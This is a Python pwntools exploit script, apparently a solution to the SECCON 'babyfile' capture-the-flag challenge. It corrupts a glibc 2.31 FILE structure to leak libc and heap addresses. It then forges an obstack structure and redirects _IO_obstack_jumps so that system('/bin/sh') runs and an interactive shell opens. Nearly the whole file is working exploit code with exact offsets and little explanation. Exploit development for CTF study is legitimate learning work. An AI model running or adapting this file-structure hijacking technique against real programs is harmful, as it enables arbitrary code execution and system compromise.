#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# obstack version of FSOP (like in:  https://nasm.re/posts/babyfile/)
# no mangled pointer, so need no leak of fs:0x30
#
# but need two leaks too.. one libc and one heap, to put obstack struct in
#

from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sla(delim,line): return p.sendlineafter(delim,line)

host, port = "babyfile.seccon.games", "3157"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])



def write(offset, data):
  sla('> ','2')
  sla('offset: ', str(offset))
  sla('value: ', str(data))

def write8(offset,data):
  for i in range(8):
    val = (data>>(i<<3))&0xff
    if (val):
      write(offset+i, val)

# do_allocate buff
write(0xd8,0xa8)
sla('> ','1')

# _IO_file_underflow => _IO_default_pbackfail
write(0xd8,0x60)
sla('> ','1')

# fflush second time leaking libc address
write(1, 0x98)	# adjust flags
write(0xd8,0xa0)
write(32,0x70)
write(40,0x78)
write(0x70,1)  # set fileno to stdout
sla('> ','1')
# calculate libc base
libc.address = u64(p.recv(8)) - 0x1e8f60
logbase()

# now we leak heap address (from main_arena)
write8(0x20, libc.address+0x1ed5a0)
write8(0x28, libc.address+0x1ed5a0+8)
sla('> ', '1')
heap = u64(p.recv(8))
logleak('heap base: ', heap)

# fake obstack chunk that we will forge
class obstack:
    chunkfun       = 56
    extra_arg      = 56+16
    use_extra_arg  = 56+16+8

_IO_obstack_jumps = libc.address + 0x1E9260
write8(0xd8, _IO_obstack_jumps-(8*9))
write8(0xe0, heap)		# obstack points to chunk on heap
# fake objstack chunk on heap
write8(obstack.chunkfun, libc.sym['system'])	# function to call
write8(obstack.extra_arg, next(libc.search(b'/bin/sh')))	# arg of function
write(obstack.use_extra_arg, 1)
sla('> ','1')

# enjoy shell
p.interactive()


